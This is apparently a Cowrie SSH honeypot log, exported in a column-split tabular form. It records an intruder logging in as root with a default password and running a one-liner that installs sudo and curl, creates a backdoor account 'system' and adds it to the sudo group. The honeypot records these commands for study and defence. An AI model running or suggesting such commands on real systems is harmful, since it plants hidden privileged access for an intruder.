2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-11-28T21:36:42+0000	[HoneyPotSSHTransport,98,170.64.165.102] Initialized emulated server as architecture: linux-x64-lsb			
2023-11-28T21:36:42+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
2023-11-28T21:36:42+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
2023-11-28T21:36:42+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-11-28T21:36:42+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-11-28T21:36:43+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 kXBt2AS9) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] CM	D:	ap	t update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kXBt2AS9) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] CM	D:	op	enssl passwd -1 kXBt2AS9
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] Ca	n'	t f	ind command openssl
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] Co	mm	and	not found: openssl passwd -1 kXBt2AS9
2023-11-28T21:36:43+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T21:36:43+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-11-28T21:36:43+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] Ca	n'	t f	ind command apt
2023-11-28T21:36:43+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,98,170.64.165.102] Co	mm	and	not found: apt update
